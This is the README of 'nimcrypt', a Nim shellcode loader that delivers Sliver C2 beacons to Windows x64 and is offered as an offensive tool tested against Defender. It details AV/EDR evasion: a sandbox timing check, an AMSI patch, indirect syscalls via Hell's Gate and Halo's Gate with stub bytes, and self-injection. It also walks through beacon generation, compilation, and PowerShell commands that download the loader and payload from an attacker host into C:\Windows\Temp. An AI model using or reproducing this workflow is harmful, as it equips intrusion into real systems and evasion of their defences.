# nimcrypt

A Sliver shellcode loader written in Nim targeting Windows x64. Two variants covering the two most common delivery situations. Tested against Windows Defender with real-time protection enabled.

## Variants

### stager

Reads an encrypted shellcode blob from disk, decrypts it in memory, and self-injects. Use this when you already have a file drop primitive and want a small, simple binary.

```
loader.exe <shellcode.bin> [key_hex iv_hex]
```

Key and IV are optional. If omitted, the file is treated as raw unencrypted shellcode.

### stageless

Downloads the encrypted blob from your C2 over HTTP using the Windows WinHTTP stack, decrypts it in memory, and self-injects. No file ever touches disk. Use this when you can execute a binary on the target but cannot reliably drop a second file.

Edit the constants at the top of `stageless/loader.nim` before compiling:

```nim
c2Host = "C2_HOST"
c2Port = 443'u16
c2Path = "/payload.bin"
scKey  = "..."   # 64 hex chars from encrypt.py
scIV   = "..."   # 32 hex chars from encrypt.py
```

## Techniques

### Sandbox evasion

The stageless loader calls `Sleep(5000)` on startup and measures actual elapsed time with `GetTickCount64`. If less than 4500ms passed, the process exits. Most automated sandbox environments fast-forward or skip sleeps, causing the check to fail. This runs before any network activity or shellcode execution so sandboxes that inspect network behaviour see nothing.

### AMSI bypass

`amsi.nim` patches `AmsiScanBuffer` at runtime using two layers of obfuscation:

**String hiding via FNV-1a hashing.** The string `AmsiScanBuffer` never appears in the binary. Instead, its FNV-1a hash is computed at compile time and stored as a constant. At runtime the loader walks amsi.dll's export table, hashes each export name, and compares against the stored value to find the function address without ever holding the string in memory.

**Compile-time XOR obfuscation.** Both the DLL name (`amsi.dll`) and the patch bytes (`xor eax, eax; ret` = `31 C0 C3`) are XOR-encoded at compile time using a random key generated fresh each build via a Python subprocess. The key is embedded as a constant and the bytes are decoded at runtime immediately before use. The raw bytes change every build, breaking static signatures on the patch sequence.

The patch overwrites the first three bytes of `AmsiScanBuffer` with `xor eax, eax; ret`, making every call return `AMSI_RESULT_CLEAN` regardless of input.

### Payload encryption

`encrypt.py` encrypts raw shellcode with AES-256-CBC using a randomly generated 32-byte key and 16-byte IV. The loader decrypts in-place using the Windows BCrypt API, so no third-party crypto library is needed on the target.

### RW to RX memory transition

Memory is allocated as `PAGE_READWRITE`, the shellcode is written into it, and then the region is flipped to `PAGE_EXECUTE_READ` before execution. Allocating directly as `PAGE_EXECUTE_READWRITE` is a well-known signature that Defender and EDRs flag explicitly. Separating the write and execute phases avoids that pattern.

### Indirect syscalls (Hell's Gate + Halo's Gate)

`stageless/syscalls.nim` bypasses both the Win32 API layer (kernel32.dll) and any ntdll.dll userland hooks placed by EDRs.

**SSN resolution.** At startup the loader gets ntdll's base address and parses its PE export table, collecting every `Nt*` export sorted by RVA. For each NT function we need, it checks the first four bytes:

- `4C 8B D1 B8` (`mov r10, rcx; mov eax, imm32`) means the stub is clean and the SSN is read directly from bytes 4-5. This is Hell's Gate.
- Anything else means the function prologue has been patched by an EDR hook. In that case the loader walks neighbors in the sorted list until it finds a clean stub, then computes the target SSN as `neighbor_SSN +/- distance`. SSNs increment by one per stub in address order. This is Halo's Gate.

**Gadget location.** The loader scans the first clean Nt* stub it finds for the byte sequence `0F 05 C3` (`syscall; ret`). This gives an address inside ntdll's image-backed `.text` section that we can reuse.

**Stub generation.** For each required function a 22-byte stub is written into a single RW page that is flipped to RX before use:

```
4C 8B D1              mov r10, rcx
B8 xx xx 00 00        mov eax, <SSN>
FF 25 00 00 00 00     jmp qword ptr [rip+0]
xx xx xx xx xx xx xx xx  gadget address
```

The `jmp [rip+0]` dereferences the 8 bytes immediately following it (the gadget address) and redirects execution into ntdll's existing `syscall; ret` sequence. The `syscall` instruction fires from ntdll's `.text` rather than from our anonymous allocation, defeating any kernel-level tracking of which memory region issued the syscall.

The four functions covered by indirect syscalls are `NtAllocateVirtualMemory`, `NtProtectVirtualMemory`, `NtCreateThreadEx`, and `NtWaitForSingleObject`.

### Self-injection

After decryption, the stageless loader allocates a RW region in its own process via `NtAllocateVirtualMemory`, copies the shellcode in with `copyMem`, flips the region to RX via `NtProtectVirtualMemory`, and spawns a thread via `NtCreateThreadEx`. The main thread then blocks indefinitely on `NtWaitForSingleObject`, keeping the process alive while the beacon's goroutines run. All four calls go through the indirect syscall stubs described above.

Self-injection keeps the call surface minimal. There are no cross-process API calls (`WriteProcessMemory`, `CreateRemoteThread`, etc.), which are the primary detection vectors for classic remote injection.

## Execution flow (stageless)

1. Timing check: sleep 5s, exit if elapsed < 4.5s
2. AMSI patch: resolve `AmsiScanBuffer` via FNV-1a, overwrite with `xor eax, eax; ret`
3. Resolve indirect syscall stubs: parse ntdll exports, find SSNs (Hell's Gate + Halo's Gate), locate `syscall; ret` gadget, write stubs
4. Download: WinHTTP GET request, read response body
5. Decrypt: AES-256-CBC via BCrypt in place
6. Allocate: `NtAllocateVirtualMemory` in own process (RW) via indirect syscall
7. Copy shellcode into the allocation
8. Protect: `NtProtectVirtualMemory` to PAGE_EXECUTE_READ via indirect syscall
9. Execute: `NtCreateThreadEx` via indirect syscall
10. Wait: `NtWaitForSingleObject` on the thread handle via indirect syscall

## Execution flow (stager)

1. AMSI patch
2. Read shellcode file from disk
3. Decrypt if key and IV were provided
4. `VirtualAlloc` (RW), copy shellcode, `VirtualProtect` to RX
5. Execute via function pointer cast

## Requirements

On your Linux build machine:

- Nim + nimble (`nimble install winim`)
- mingw-w64 (`x86_64-w64-mingw32-gcc`)
- Python 3 + pycryptodome (`pip install pycryptodome`)

## Full workflow

### 1. Start a Sliver listener

```
[server] sliver > mtls --lhost 10.10.14.42 --lport 443
```

### 2. Generate beacon shellcode

```
[server] sliver > generate beacon --mtls 10.10.14.42:443 --os windows --arch amd64 --format shellcode --skip-symbols beacon
```

### 3. Encrypt

```bash
python3 encrypt.py beacon.bin
# key: 16cd37303052eb9068cf18eee3fd36c2f448afc2778bbd5aa6b2eaf416191997
# iv:  83b82994e8c512d536f7d42e89d6e761
```

### 4. Set constants and compile

Edit `stageless/loader.nim` and set `c2Host`, `c2Port`, `c2Path`, `scKey`, `scIV`, then from the project root:

```bash
# stageless
nim c -d:release -o:bins/loader.exe stageless/loader.nim

# stager
nim c -d:release -o:bins/loader.exe stager/loader.nim
```

Always compile from the project root so that only the root `nim.cfg` is loaded. The output is a statically linked Windows x64 PE with no external DLL dependencies beyond standard system libraries.

### 5. Serve or transfer

Stageless: serve the encrypted blob over HTTP on the port matching `c2Port`:

```bash
cd bins && python3 -m http.server 443
```

Stager: transfer both files to the target:

```powershell
(New-Object Net.WebClient).DownloadFile("http://10.10.14.42/loader.exe", "C:\Windows\Temp\loader.exe")
(New-Object Net.WebClient).DownloadFile("http://10.10.14.42/beacon_enc.bin", "C:\Windows\Temp\beacon.bin")
```

### 6. Execute

Stageless:
```
loader.exe
```

Stager with encryption:
```
loader.exe beacon.bin 16cd37303052eb9068cf18eee3fd36c2f448afc2778bbd5aa6b2eaf416191997 83b82994e8c512d536f7d42e89d6e761
```

Stager without encryption:
```
loader.exe shellcode.bin
```

## PowerShell delivery

If delivering via a PowerShell download cradle, AMSI will scan the script before the loader runs. Patch AMSI in your PS session first:

```bash
python3 gen_amsi.py
```

Paste the output into the PS session before downloading or executing anything. The script resolves `AmsiScanBuffer` by export table hash so the string never appears in plaintext, and all patch bytes are XOR-encoded with a random per-run key.

## Notes

- Requires Windows 10 / Server 2016+ (Universal CRT)
- `BCryptSetProperty` for chaining mode returns `STATUS_INVALID_PARAMETER` but BCrypt defaults to CBC regardless, decryption works correctly
- Indirect syscalls cover only the four injection-critical NT functions. Winsock and BCrypt calls still go through their normal API paths, which is acceptable since those calls are behaviorally benign in isolation
- The `syscall` instruction in the stubs fires from inside ntdll's `.text` section (image-backed, Microsoft-signed), not from the stub page, defeating kernel-level syscall origin tracking

## References

- https://github.com/gatariee/ldrgen
- https://github.com/D3Ext/Hooka
